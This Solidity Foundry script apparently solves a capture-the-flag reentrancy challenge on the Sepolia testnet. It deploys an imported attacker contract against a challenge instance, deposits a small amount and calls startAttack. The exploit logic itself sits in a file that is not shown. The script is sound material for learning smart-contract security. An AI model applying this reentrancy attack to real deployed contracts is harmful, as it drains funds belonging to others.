//SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import "../src/utils/SepoliaInstances.sol";
import "../src/ReentrancySolution.sol";
import "forge-std/Script.sol";


interface IReentrancy {
    function balances(address) external returns (uint256);
}
contract ReentrancySolutionScript is Script, SepoliaInstances {

    // state vars
    uint256 public initialDepositAmount = 1e15; // 1 finney


    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        // deploy reentrancy attacker contract
        

        ReentrancySolution solution = new ReentrancySolution(payable(reentrancyInstance));

        solution.donateToVault{value: 1e15}();
        solution.startAttack(initialDepositAmount);

        vm.stopBroadcast();

        /* uint256 contractBalances = address(reentrancyInstance).balance;
        uint256 solutionUserBalance = IReentrancy(reentrancyInstance).balances(0xF0D8BE44301B963379B04349decD8d034b61827d);

        console.log("contract balance", contractBalances);
        console.log("solutionUser balance", solutionUserBalance); */

    }
}